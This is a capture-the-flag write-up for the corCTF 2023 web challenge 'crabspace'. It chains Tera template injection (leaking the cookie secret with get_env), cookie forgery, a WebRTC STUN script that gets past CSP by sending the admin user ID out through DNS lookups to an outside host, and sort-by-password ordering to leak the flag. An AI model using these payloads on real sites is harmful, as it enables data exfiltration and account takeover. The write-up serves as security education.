---
layout: post
title: corCTF 2023 web/crabspace Writeup
tags: [ctf, ctf writeup, ctf web]
---

[corCTF](https://2023.cor.team/challs)  
[Event on CTFtime](https://ctftime.org/event/1928)

It was a team effort for us to solve this challenge. I learned something new about WebRTC.

## Solution summary

- SSTI in `Tera::one_off` to leak secret
- WebRTC to bypass CSP restrictions and exfiltrate admin user id
- Forge admin cookie with admin user id and secret to gain access to admin view
- Follow admin account and sort following accounts on password field to leak admin password (which is the flag)

## crabspace

- Description:
  > Now that Twitter is 🦀 gone 🦀, it's time for a new social media platform.  
    🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀🦀
- Author: Strellic

The source code is provided. I can create users, edit my "space", view other users' "space"s, and follow other users.

![crabspace](/assets/image/corctf-2023-crabspace-web-writeup/crabspace.png)

To view a user's "space", visit `/space/<user id>`, The user id is UUIDv4 generated when the user is created. The "space" content is rendered in an `iframe`, with the content in the `iframe`'s `srcdoc` attribute.

{% raw %}
```html
<iframe sandbox="allow-scripts"
srcdoc="<link rel='stylesheet' href='/public/axist.min.css' />{{ space }}" class="space"></iframe>
```
{% endraw %}

With content in `srcdoc`, it is rendered as HTML in the `iframe` even it is escaped in the template, thus we have an easy(?) XSS.

The users are defined as a struct as shown below and stored in a map.

```rust
#[derive(Debug, Serialize, Clone)]
pub struct User {
    pub id: Uuid,
    pub name: String,
    pub pass: String,
    pub following: Vec<Uuid>,
    pub followers: Vec<Uuid>,
    pub space: String,
}
```

The admin user with flag as the password, and a random ID is created on starting of the application.

The bot first logs in as admin, then visit an URL we provide.

## Finding SSTI

Initially it was not clear how we can get the flag from what is obvious. While I was on the train I read the source code twice and with the help of [documentation](https://docs.rs/tera/latest/tera/struct.Tera.html#method.one_off) I found the `one_off` function in Tera when rendering "space" page is a bit suspicious.

```rust
ctx.tera.insert(
    "space",
    &Tera::one_off(&user.space, &ctx.tera, true).unwrap_or_else(|_| user.space.clone()),
);
ctx.tera.insert("id", &id);
utils::render(tera, "space.html", ctx.tera).into_response()
```

![one_off is used in the code.](/assets/image/corctf-2023-crabspace-web-writeup/one-off.png)

The code takes the user's "space" as template and renders it. Tera templates documentation can be found at <https://tera.netlify.app/docs/#templates>.

When I printed out the template context with {% raw %}`{{ __tera_context }}`{% endraw %}, I got:

{% raw %}
```
{ "user": { "followers": [], "following": [], "id": "af787749-d532-4d37-94a6-2d6bc4201f63", "name": "lollol", "pass": "", "space": "{{ __tera_context }}" } }
```
{% endraw %}

The context includes the user struct, which includes the ID of the logged in user. However, the password is set to empty string when the context is created:

```rust
user = USERS.get(&id).map(|v| User {
    pass: "".to_string(),
    ..v.clone()
});
```

We can use SSTI to leak the secret for session cookie with {% raw %}`{{ get_env(name="SECRET") }}`{% endraw %}. With the secret and the user ID of admin, we can forge a session cookie to login as admin.

## Leak admin user ID

With the SSIT which can render the user ID and XSS, leaking the admin user ID should be easy right? However, with the very strict fetch directive CSP below, we tried including fetch API, WebSocket, meta tag and JS redirect, form and DNS prefetch, but had no luck exfiltrating the data. I could not find any endpoint on within the challenge that I could use style-src to exfiltrate the data neither.

```
default-src 'none'; style-src 'self'; script-src 'unsafe-inline'; frame-ancestors 'none'
```

I then reading through all non-fetch directives in CSP, and some research. While getting ready to go to bed, thinking about all the cases where a webpage makes request to server, WebRTC came to my mind (I have also noticed [a very new TR about WebRTC](https://www.w3.org/TR/webrtc-nv-use-cases/), which may or may not be related). As I do not know much about WebRTC, I put a message on our Discord channel before I went to bed.

The next morning, I started with some WebRTC examples. The payload is limited to only 200 characters, with some trial and error, I managed to craft a minimal payload that would do DNS request for the STUN server I specify (the payload has been modified to be more readable):

{% raw %}
```html
<script>
async function a(){
    c={iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:1337"}]}
    (p=new RTCPeerConnection(c)).createDataChannel("d")
    await p.setLocalDescription()
}
a();
</script>
```
{% endraw %}

The port does not matter, as we are exfiltrating through DNS request. The user ID is included in the hostname and sent through DNS request.

## Getting the flag

The admin account has access to admin view for each user (except admin itself). The admin view has the lists of followers and followings of the user. The lists are sorted with field specified in the URL query parameter. It is possible to sort by password field using `?sort=pass`.

We can have a main account to follow other users. We can then create a list of users with selected password, and follow them along with admin on our main account. The admin view for the main account will have the list of users sorted by password, and we can get the flag character by character. This can be scripted with preparing the whole following list and get one character each time we visit the admin view, or can script with binary search. (This is kinda pain to extract the flag, thanks to my teammate implemented the solution.)

Got the flag 🦀:

```
corctf{b3tter_name_th4n_x}
```